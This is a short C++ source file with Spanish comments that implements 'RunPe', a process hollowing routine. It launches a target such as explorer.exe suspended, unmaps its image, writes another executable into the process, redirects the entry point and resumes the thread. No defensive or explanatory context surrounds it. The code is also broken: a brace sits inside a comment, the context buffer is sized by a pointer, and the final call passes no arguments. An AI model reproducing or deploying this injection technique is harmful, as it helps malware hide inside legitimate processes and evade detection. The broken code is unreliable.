void RunPe( wstring const& objetivo, wstring const& ruta){
    Pe src_pe(ruta);
    if ( src_pe.isvalid ){        
        Process::CreationResults res = Process::CreateWithFlags( objetivo, L"", CREATE_SUSPENDED, false, false ); // Empieza a suspender las instancias
        if ( res.success ){
            PCONTEXT CTX = PCONTEXT( VirtualAlloc( NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE)); // Aparta un espacio para el contexto
            CTX->ContextFlags = CONTEXT_FULL;

            if ( GetThreadContext( res.hThread, LPCONTEXT( CTX )))  // Lee el contexto del objetivo{
                DWORD dwImageBase;
                ReadProcessMemory( res.hProcess, LPCVOID( CTX->Ebx + 8 ), LPVOID( &dwImageBase ), 4, NULL ); // Obtiene la direccion base del objetivo
                
                typedef LONG( WINAPI * NtUnmapViewOfSection )(HANDLE ProcessHandle, PVOID BaseAddress);
                NtUnmapViewOfSection xNtUnmapViewOfSection;
                xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
                if ( 0 == xNtUnmapViewOfSection( res.hProcess, PVOID( dwImageBase ) ) ) {  // Desmarca el codigo del objetivo
                    LPVOID imagenBase = VirtualAllocEx(res.hProcess, LPVOID(dwImageBase), src_pe.NtHeadersx86.OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);  // Reubica la ruta para el codigo
                    if ( imagenBase ){
                        Buffer rutaHeaders( src_pe.NtHeadersx86.OptionalHeader.SizeOfHeaders ); // Le la ruta de los headers
                        PVOID rutaHeadersPun = src_pe.GetPointer( 0 );
                        if ( src_pe.ReadMemory( rutaHeaders.Data(), rutaHeadersPun, rutaHeaders.Size() ) ){
                            if ( WriteProcessMemory(res.hProcess, imagenBase, rutaHeaders.Data(), rutaHeaders.Size(), NULL) ) {  // Escribe en la ruta de los headers
                                bool completado = true;
                                for (u_int i = 0; i < src_pe.sections.size(); i++) {   // Escribe en todas las secciones
                                    // Obtiene el puntero de la seccion y copia su contenido
                                    Buffer rutaSeccion( src_pe.sections.at( i ).SizeOfRawData );
                                    LPVOID seccionPuntero = src_pe.GetPointer( src_pe.sections.at( i ).PointerToRawData );
                                    completado &= src_pe.ReadMemory( rutaSeccion.Data(), seccionPuntero, rutaSeccion.Size() );                                    

                                    // Escribe el contenido del objetivo
                                    completado &= WriteProcessMemory(res.hProcess, LPVOID(DWORD(imagenBase) + src_pe.sections.at( i ).VirtualAddress), rutaSeccion.Data(), rutaSeccion.Size(), NULL);
                                }

                                if ( completado ){
                                    WriteProcessMemory( res.hProcess, LPVOID( CTX->Ebx + 8 ), LPVOID( &imagenBase), sizeof(LPVOID), NULL ); // Rescribe la imagen base
                                    CTX->Eax = DWORD( imagenBase ) + src_pe.NtHeadersx86.OptionalHeader.AddressOfEntryPoint;        // Rescribe el punto de entrada
                                    SetThreadContext( res.hThread, LPCONTEXT( CTX ) );                                              // Setea el contexto del hilo
                                    ResumeThread( res.hThread );                                                                    // Reanuda al hilo principal
                                }                               
                            }
                        }                       
                    }
                }
            }
            if ( res.hProcess) CloseHandle( res.hProcess );
            if ( res.hThread ) CloseHandle( res.hThread );
        }
    }
}

/* Ejemplo  L"C:\\windows\\explorer.exe", L"C:\\windows\\system32\\calc.exe" */
RunPe();